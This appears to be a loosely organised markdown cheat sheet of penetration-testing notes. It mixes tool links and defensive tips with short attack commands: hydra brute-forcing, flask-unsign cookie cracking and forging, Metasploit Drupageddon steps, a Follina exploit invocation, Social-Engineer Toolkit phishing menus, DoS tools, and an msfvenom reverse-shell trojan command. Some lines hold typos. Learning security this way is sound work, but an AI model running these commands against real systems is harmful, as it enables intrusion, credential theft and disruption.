# Frameworks for Recording Threat Actions
https://attack.mitre.org/

## Exploitation is someone brute-forcing it with hydra
hydra -L users.txt -P pass.txt IP_ADDRESS ftp -V

# Intrusion Prevention System (IPS) is security system for catching and preventing security threats.
 ▪ It works on predefined security rules, just like IP

https://www.snort.org/

## How to Check What Ports are Opened on Your PC?
 ▪ Windows: netstat –an, netstat –antb
 ▪ Unix: ss -nltp, netstat –tulpn

# JWT Token Vulnerability
```sh
flask-unsign -u -c .XXXXXXXXX -nE -w /usr/share/wordlists/rockyou.txt
flask-unsign -s --secret "secret123" --cookie "{'loggin': True, 'username': 'blue'}" -l
sudo -l
```

## How to Search for Vulnerabilities?
ExploitDB
https://www.exploit-db.com/


## Drupal7  (Versions 7.0 to 7.31 are vulnerable to SQL Injection)

```sh
smsf6 exploit(multi/http/drupal_drupageddon) > show options
msf6 exploit(multi/http/drupal_drupageddon) > exploit
```
## How to Prevent Obsolete Software Vulnerabilities?

▪ Updates are not just for new functionalities, most of them are designed for fixing security problems –ALWAYS BE UPDATED!   <br />
▪ Look for updates in different aspects of your context, for example if the Wordpressengine is the latest version, but the plugins inside are outdated, the same problems can occur.   <br />
▪ Look at your system as a whole, donot divide it. If you update any aspect of it, make sure to update all other subsystems   <br />

## How to brute-force a Password?

▪ Using hydra (https://github.com/vanhauser-thc/thc-hydra)

Let's see more: 

▪ https://hashcat.net/wiki/doku.php?id=example_hashes <br />
▪ https://crackstation.net <br />

## Get hash with Responder  <br /> 
https://github.com/SpiderLabs/Responder <br />


# Zero Days Marketplace (There is a database and a marketplace for that) <br />
https://0day.today

# Using Folina 
```sh
python3 follina.py -r 9999 <br />
```
More Details at: https://www.hackthebox.com/blog/cve-2022-30190-follina-explained


## More Databases for Vulnerabilities:

 ▪https://www.cve.org/ <br />
 ▪https://www.exploit-db.com/ <br />
 ▪https://nvd.nist.gov/ <br />
 ▪https://www.cvedetails.com <br />

# Frameworks to Perform Wi-Fi Attacks

▪ Airgeddon(https://github.com/v1s1t0r1sh3r3/airgeddon)   <br />
▪ WiFiPhisher(https://github.com/wifiphisher/wifiphisher)   <br />
▪ WiFiExploitation Framework (https://github.com/D3Ext/WEF)   <br />
 
python listener.py
▪ Source: https://www.youtube.com/watch?v=A8DkVDQW1-w

Technical Side of Phishing Attacks is Scary Easy to Replicate <br />
**More details at:** https://github.com/trustedsec/social-engineer-toolkit

sudo setoolkit

Select from the menu:
1) Social-engineering Attacks   <br />
2) Penetration Testing (Fast-Track)   <br />
3) Third Party Modules   <br />
4) Update the Social-Engineer Toolkit   <br />

PRESS: set> 1

Select from the menu:
1) Spear-Phishing Attack Vectors   <br />
2) Website Attack Vectors   <br />
3) Infectious Media Generator   <br />

set> 2

Denial of Service (DOS)is the easiest to perform attack

LOIC (https://sourceforge.net/projects/loic/)–TCP, UDP, HTTP    <br />
GET FLOODS   <br /> 
 ▪HOIC (https://sourceforge.net/projects/highorbitioncannon/)   <br />
 HTTP GET / POST requests   <br />
 ▪hping3: https://www.kali.org/tools/hping3/   <br />
 ▪TorsHammer: https://github.com/Karlheinzniebuhr/torshammer   <br />


## How to Generate Simple (and Detectable of Course) Trojan for Reverse Shell Callback?

MSFvenom(MSFvenom-MetasploitUnleashed (offensive security.com))   <br />
 ▪msfvenom–p windows/x64/shell/reverse_tcpLHOST=IP    <br />
LPORT=PORT –f exe –o file.exe   <br />

# Ransomware

1) WannaCry;
2) CryptoLocker;
3) BadRabbit;

# Spyware
Spywareis a type of malware that stays hidden and gathers as much sensitive data as possible

#  SQL Injection
There are many types of SQL Injection attacks, such as: error based, stacked queries, union based and more;

smsf6 exploit(multi/http/drupal_drupageddon) > show options
msf6 exploit(multi/http/drupal_drupageddon) > exploit

# Brute Forcing Attacks   <br />
 ▪Example software for performing the attack:   <br />
 ▪THC-Hydra: https://github.com/vanhauser-thc/thchydra   <br />
 ▪Burp Intruder: https://portswigger.net/burp/pro   <br />
 ▪Medusa: https://github.com/jmk-foofus/medusa   <br />

# Security Information and Event Management - SIEM for Securty analysis
QRadar SIEM Demo

▪ Enumerating Reverse Shells
```sh
ps -aef --forest
```

 ▪Analyzing Sliver C2 HTTP Beacon with Wireshark:

# Penetration Testing Operational Systems (OS)
▪ Kali Linux (https://www.kali.org)   <br />
▪ Parrot OS (https://www.parrotsec.org)  <br />
▪ Black Arch (https://blackarch.org)   <br />
▪ CommandoVM(https://github.com/mandiant/commando-vm)   <br />
▪ Nessus (https://www.tenable.com/products/nessus)   <br />
▪ Nmap (https://nmap.org)   <br />
▪ BurpSuite(https://portswigger.net/burp)   <br />
▪ Searchsploit(https://www.exploit-db.com/searchsploit)   <br />

## Scanning local system for *privilege escalation* attack vectors with linpeas
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS   <br />

▪ On github: https://github.com/juliocesarfort/public-pentesting-reports   <br />

TryHackMe: https://tryhackme.com/   <br />
▪ Vulnhub: https://www.vulnhub.com/   <br />
▪ HackTheBox: https://www.hackthebox.com/   <br />

Use ATT&CK Navigator (https://mitre-attack.github.io/attack-navigator/)to map a sample TTP   <br />

USING KALI LINUX with Seclists and Run:   <br />
```sh
cd /opt/
sudo git clone https://github.com/danielmiessler/SecLists" 
cd /usr/share/wordlists
sudo gzip–d rockyou.txt.gz
```